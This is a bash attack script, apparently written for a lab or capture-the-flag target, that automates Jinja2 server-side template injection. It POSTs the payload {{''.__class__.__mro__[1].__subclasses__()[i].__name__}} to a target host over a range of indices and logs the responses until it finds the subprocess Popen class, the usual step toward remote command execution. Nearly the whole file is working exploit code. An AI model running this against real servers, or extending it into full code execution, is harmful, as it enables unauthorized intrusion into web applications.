#!/usr/bin/env bash
# ~/ssti_find_popen_long.sh
# Robust SSTI Popen index finder for slow servers
#
# Usage:
#   ./ssti_find_popen_long.sh <target-ip-or-host> [max_index]
# Example:
#   ./ssti_find_popen_long.sh 10.42.132.253 1200

TARGET="${1:-10.42.132.253}"
MAX_INDEX="${2:-1000}"
URL="http://${TARGET}/"
OUT="/tmp/ssti_subs.log"
TIMEOUT_CONN=5
TIMEOUT_TOTAL=12

echo "[*] Target: ${TARGET}"
echo "[*] Max index: ${MAX_INDEX}"
echo "[*] Output log: ${OUT}"
echo

# clean previous log
: > "${OUT}"

for i in $(seq 0 "${MAX_INDEX}"); do
  # payload prints the __name__ of subclass at index $i
  payload="{{''.__class__.__mro__[1].__subclasses__()[$i].__name__}}"

  # send the payload with timeouts; capture both body and curl exit status
  # write response snippet to log with index header
  echo "----- INDEX ${i} -----" >> "${OUT}"
  curl -s --connect-timeout ${TIMEOUT_CONN} --max-time ${TIMEOUT_TOTAL} \
    -X POST --data-urlencode "content=${payload}" "${URL}" >> "${OUT}" 2>&1
  echo -e "\n" >> "${OUT}"

  # Read a short snippet for console output
  snippet=$(sed -n "/----- INDEX ${i} -----/,+2p" "${OUT}" | tr '\n' ' ' | sed -n '1,240p')

  # Progress print every 5 indices (adjust as desired)
  if (( i % 5 == 0 )); then
    echo "[*] checked index ${i} => ${snippet:0:160}"
  fi

  # test for Popen in the snippet
  if echo "${snippet}" | grep -q "Popen"; then
    echo
    echo "[+] Found 'Popen' at index ${i}"
    echo "[+] Snippet:"
    echo "${snippet}" | sed -n '1,4p'
    echo "[*] Full response saved in ${OUT}"
    exit 0
  fi

  # small sleep to be polite and avoid hammering a slow server
  sleep 0.25
done

echo
echo "[-] Popen not found in indices 0..${MAX_INDEX}. See ${OUT} for details."
exit 1
